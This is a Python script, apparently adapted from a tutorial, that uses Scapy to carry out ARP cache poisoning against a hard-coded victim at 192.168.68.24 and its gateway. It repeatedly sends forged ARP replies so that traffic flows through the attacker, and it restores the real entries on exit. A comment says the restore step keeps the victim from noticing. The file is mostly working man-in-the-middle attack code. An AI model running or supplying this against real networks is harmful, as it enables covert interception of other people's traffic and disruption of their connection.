from scapy.all import Ether, ARP, srp, send, sendp
import argparse
import time
import os
import sys

# IP Forwarding

# def _enable_linux_iproute():
#     """
#     Enables IP route ( IP Forward ) in linux-based distro
#     """
#     file_path = "/proc/sys/net/ipv4/ip_forward"
#     with open(file_path) as f:
#         if f.read() == 1:
#             # already enabled
#             return
#     with open(file_path, "w") as f:
#         print(1, file=f)


def _enable_windows_iproute():
    """
    Enables IP route (IP Forwarding) in Windows
    """
    from services import WService
    # enable Remote Access service
    service = WService("RemoteAccess")
    service.start()


# def enable_ip_route(verbose=True):
#     """
#     Enables IP forwarding
#     """
#     if verbose:
#         print("[!] Enabling IP Routing...")
#     _enable_windows_iproute() if "nt" in os.name else _enable_linux_iproute()
#     if verbose:
#         print("[!] IP Routing enabled.")

# Utility function that allows us to get the MAC address of any machine in the network:


def get_mac(ip):
    """
    Returns MAC address of any device connected to the network
    If ip is down, returns None instead
    """
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') /
                 ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src

# a function that : given a target IP address and a host IP address, it changes the ARP cache of the target IP address, saying that we have the host's IP address


def spoof(target_ip, host_ip, verbose=True):
    """
    Spoofs `target_ip` saying that we are `host_ip`.
    it is accomplished by changing the ARP cache of the target (poisoning)
    """
    # get the mac address of the target
    target_mac = get_mac(target_ip)
    # craft the arp 'is-at' operation packet, in other words; an ARP response
    # we don't specify 'hwsrc' (source MAC address)
    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac,
                       psrc=host_ip, op='is-at')
    # send the packet
    # verbose = 0 means that we send the packet without printing any thing
    sendp(arp_response, verbose=0)
    if verbose:
        # get the MAC address of the default interface we are using
        self_mac = ARP().hwsrc
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))


# Once we want to stop the attack, we need to re-assign the real addresses to the target device (as well as the gateway),
# if we don't do that, the victim will lose internet connection, and it will be evident that something happened, we don't want to do that,
# we will send seven legitimate ARP reply packets (a common practice) sequentially:
def restore(target_ip, host_ip, verbose=True):
    """
    Restores the normal process of a regular network
    This is done by sending the original informations 
    (real IP and MAC of `host_ip` ) to `target_ip`
    """
    # get the real MAC address of target
    target_mac = get_mac(target_ip)
    # get the real MAC address of spoofed (gateway, i.e router)
    host_mac = get_mac(host_ip)
    # crafting the restoring packet
    arp_response = ARP(pdst=target_ip, hwdst=target_mac,
                       psrc=host_ip, hwsrc=host_mac)
    # sending the restoring packet
    # to restore the network to its normal process
    # we send each reply seven times for a good measure (count=7)
    sendp(arp_response, verbose=0, count=7)
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))


# spoofing both; the target and host (gateway) infinitely until CTRL+C is detected, so we will restore the original addresses:
if __name__ == "__main__":

    # victim ip address
    target = "192.168.68.24"
    # gateway ip address

    host = "192.168.68.1"
    # print progress to the screen
    verbose = True
    # # enable ip forwarding
    # _enable_windows_iproute()
    # enable_ip_route()
    try:
        while True:
            # telling the `target` that we are the `host`
            spoof(target, host, verbose)
            # telling the `host` that we are the `target`
            spoof(host, target, verbose)
            # sleep for one second
            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! restoring the network, please wait...")
        restore(target, host)
        restore(host, target)
